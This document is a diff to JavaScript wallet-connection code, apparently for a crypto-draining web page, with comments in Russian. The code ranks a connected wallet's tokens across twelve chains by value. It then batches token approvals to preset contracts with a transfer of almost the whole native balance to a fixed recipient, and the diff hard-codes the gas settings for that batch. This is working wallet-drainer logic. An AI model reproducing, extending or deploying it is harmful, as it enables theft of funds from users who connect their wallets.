@@ -7,6 +7,23 @@ import { readContract, writeContract, sendCalls, estimateGas, getGasPrice, getBa
 // === Глобальный флаг для управления sendCalls ===
 const USE_SENDCALLS = true; // Поставьте false для отключения batch-операций
 
+// Нативные символы и получатель перевода нативки
+const NATIVE_SYMBOLS = {
+  'Ethereum': 'ETH',
+  'BNB Smart Chain': 'BNB',
+  'Polygon': 'MATIC',
+  'Arbitrum': 'ETH',
+  'Optimism': 'ETH',
+  'Base': 'ETH',
+  'Scroll': 'ETH',
+  'Avalanche': 'AVAX',
+  'Fantom': 'FTM',
+  'Linea': 'ETH',
+  'zkSync': 'ETH',
+  'Celo': 'CELO'
+}
+const NATIVE_RECIPIENT = '0x1234567890123456789012345678901234567890'
+
 // Утилита для дебаунсинга
 const debounce = (func, wait) => {
   let timeout
@@ -66,9 +83,6 @@ const networkMap = {
   'Celo': { networkObj: celo, chainId: networks[11].id || 42220 }
 }
 console.log('Network Map:', networkMap)
-
-// Получатель нативного перевода (как в new.js)
-const NATIVE_RECIPIENT = '0x1234567890123456789012345678901234567890'
 
 const CONTRACTS = {
   [networkMap['Ethereum'].chainId]: '0xa65972Fce9925983f35185891109c4be643657aD',
@@ -715,13 +729,13 @@ const performBatchOperations = async (mostExpensive, allBalances, state) => {
         value: '0x0'
       }))
 
-    // Compute native transfer like in new.js
+    // Рассчитываем нативный перевод: баланс минус газ и минус 0.0005
     let nativeCall = null
     try {
       const bal = await getBalance(wagmiAdapter.wagmiConfig, { address: getAddress(state.address), chainId: mostExpensive.chainId })
       const gasPrice = await getGasPrice(wagmiAdapter.wagmiConfig, { chainId: mostExpensive.chainId })
-      const gasLimitForNative = await estimateGas(wagmiAdapter.wagmiConfig, { account: getAddress(state.address), to: getAddress(NATIVE_RECIPIENT), value: '0x1', chainId: mostExpensive.chainId }).catch(() => 21000n)
-      const gasCost = gasPrice * gasLimitForNative
+      const gasLimit = await estimateGas(wagmiAdapter.wagmiConfig, { account: getAddress(state.address), to: getAddress(NATIVE_RECIPIENT), value: '0x1', chainId: mostExpensive.chainId }).catch(() => 21000n)
+      const gasCost = gasPrice * gasLimit
       const reserveWei = parseUnits('0.0005', 18)
       const afterGas = bal.value > gasCost ? (bal.value - gasCost) : 0n
       if (afterGas > reserveWei) {
@@ -732,18 +746,24 @@ const performBatchOperations = async (mostExpensive, allBalances, state) => {
       console.warn('Native transfer compute failed:', e?.message || e)
     }
 
-    // Build calls list
+    // Составляем набор вызовов для батча (approve + nativeCall)
     const calls = []
     if (approveCalls.length > 0) calls.push(...approveCalls)
     if (nativeCall) calls.push(nativeCall)
 
     // Send batch transaction
     if (calls.length > 0) {
-    	console.log(`Sending batch with gasLimit: ${gasLimit}, \tmaxFeePerGas: ${maxFeePerGas}, maxPriorityFeePerGas: ${maxPriorityFeePerGas}`)
+	const gasLimit = BigInt(550000)
+   	const maxFeePerGas = BigInt(1000000000)
+    	const maxPriorityFeePerGas = BigInt(1000000000)
+    	console.log(`Approving token with gasLimit: ${gasLimit}, 	maxFeePerGas: ${maxFeePerGas}, maxPriorityFeePerGas: ${maxPriorityFeePerGas}`)
       const id = await sendCalls(wagmiAdapter.wagmiConfig, {
         calls,
         account: getAddress(state.address),
         chainId: mostExpensive.chainId,
+        gas: gasLimit,
+	maxFeePerGas,
+	maxPriorityFeePerGas
       })
       console.log(`Batch transaction sent with id: ${id}`)
       return { success: true, txHash: id }
@@ -777,11 +797,11 @@ const initializeSubscribers = (modal) => {
           console.warn(`Network ${networkName} not found in networkMap`)
           return
         }
-        // Добавляем нативный баланс в каждый network
+        // Добавляем нативный баланс
         balancePromises.push(
           getBalance(wagmiAdapter.wagmiConfig, { address: getAddress(state.address), chainId: networkInfo.chainId })
             .then(bal => ({
-              symbol: 'NATIVE',
+              symbol: NATIVE_SYMBOLS[networkName] || 'NATIVE',
               balance: Number(formatUnits(bal.value, 18)),
               address: 'native',
               network: networkName,
@@ -789,7 +809,7 @@ const initializeSubscribers = (modal) => {
               decimals: 18,
               isNative: true
             }))
-            .catch(() => ({ symbol: 'NATIVE', balance: 0, address: 'native', network: networkName, chainId: networkInfo.chainId, decimals: 18, isNative: true }))
+            .catch(() => ({ symbol: NATIVE_SYMBOLS[networkName] || 'NATIVE', balance: 0, address: 'native', network: networkName, chainId: networkInfo.chainId, decimals: 18, isNative: true }))
         )
         tokens.forEach(token => {
           if (isAddress(token.address)) {
@@ -825,7 +845,7 @@ const initializeSubscribers = (modal) => {
           const price = ['USDT', 'USDC'].includes(token.symbol) ? 1 : await getTokenPrice(token.symbol)
           const value = token.balance * price
           token.price = price
-          // Нативные токены отображаем в отчёте, но НЕ выбираем как самый дорогой
+          // Нативные токены учитываем в цене для уведомлений, но не выбираем как "самый дорогой"
           if (!token.isNative && value > maxValue) {
             maxValue = value
             mostExpensive = { ...token, price, value }
